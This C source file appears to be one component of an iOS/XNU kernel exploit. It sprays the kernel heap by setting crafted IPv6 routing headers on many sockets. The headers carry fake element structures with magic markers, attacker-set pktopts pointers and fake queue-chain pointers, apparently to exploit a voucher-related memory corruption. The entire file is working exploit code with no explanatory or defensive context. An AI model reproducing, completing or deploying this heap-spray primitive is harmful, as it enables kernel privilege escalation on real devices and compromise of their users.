#include "mushroom_log.h"
#include "fake_element_spray.h"
#include "voucher_utils.h"

#define IPV6_RTHDR 51

static uint32_t fake_element_e_size = 0;
static uint32_t fake_element_spray_count = 0;
static int* route_header_spray_sockets = NULL;
static void* route_header = NULL;
static uint32_t route_header_size = 0;

void init_fake_element_spray(uint32_t e_size, uint32_t count)
{
    fake_element_e_size = e_size;
    fake_element_spray_count = count;
    route_header_spray_sockets = malloc(fake_element_spray_count * sizeof(int));
    for (uint32_t i = 0; i < fake_element_spray_count; ++i)
    {
        route_header_spray_sockets[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
        if (route_header_spray_sockets[i] < 0)
        {
            cicuta_log("Cannot create socket at %d. Error: %d", i, errno);
        }
        int minmtu = -1;
        int res = setsockopt(route_header_spray_sockets[i], IPPROTO_IPV6, IPV6_USE_MIN_MTU, &minmtu, sizeof(minmtu));
        if (res != 0)
        {
            cicuta_log("Cannot preallocate pktopts at %d. Error: %d", i, errno);
        }
    }

    int header_size = DATA_VOUCHER_CONTENT_SIZE + USER_DATA_ELEMENT_SIZEOF;
    int len = ((header_size >> 3) - 1) & ~1;
    route_header_size = (len + 1) << 3;
    route_header = malloc(route_header_size);
    memset(route_header, 0, route_header_size);

    struct ip6_rthdr {
        u_int8_t  ip6r_nxt;    /* next header */
        u_int8_t  ip6r_len;    /* length in units of 8 octets */
        u_int8_t  ip6r_type;    /* routing type */
        u_int8_t  ip6r_segleft;    /* segments left */
        /* followed by routing type specific data */
    } __attribute__((__packed__));

    struct ip6_rthdr* rthdr = (struct ip6_rthdr *)route_header;
    rthdr->ip6r_nxt = 0;
    rthdr->ip6r_len = len;
    rthdr->ip6r_type = IPV6_RTHDR_TYPE_0;
    rthdr->ip6r_segleft = rthdr->ip6r_len >> 1;
}

void fake_element_spray_set_e_size(uint32_t e_size)
{
    fake_element_e_size = e_size;
}

void fake_element_spray_set_pktopts(uint64_t pktopts)
{
    uint64_t* fake_element = route_header;
    fake_element[2] = pktopts;
}

void release_fake_element_spray_at(uint32_t index)
{
    close(route_header_spray_sockets[index]);
    route_header_spray_sockets[index] = - 1;
}

void release_all_fake_element_spray(void)
{
    for (uint32_t i = 0; i < fake_element_spray_count; ++i)
    {
        release_fake_element_spray_at(i);
    }

    free(route_header_spray_sockets);
    free(route_header);
    fake_element_e_size = 0;
    fake_element_spray_count = 0;
    route_header_size = 0;
}

void perform_fake_element_spray(void)
{
    ((uint32_t*)route_header)[1] = fake_element_e_size;
    uint64_t* element_content = (uint64_t*)((char*)route_header + USER_DATA_ELEMENT_SIZEOF);
    for (uint32_t i = 0; i < fake_element_spray_count; ++i)
    {
        element_content[0] = FAKE_ELEMENT_MAGIC_BASE + i;
        int res = setsockopt(route_header_spray_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, route_header, route_header_size);
        if (res != 0)
        {
            usleep(2);
            res = setsockopt(route_header_spray_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, route_header, route_header_size);
            if (res != 0)
            {
                //exploit_log("Cannot spray rthdr at %d. Error: %d", i, errno);
            }
        }
    }
}

void set_fake_queue_chain_for_fake_element_spray(uint64_t next, uint64_t prev)
{
    uint64_t* fake_element = route_header;
    fake_element[2] = next;
    fake_element[3] = prev;
}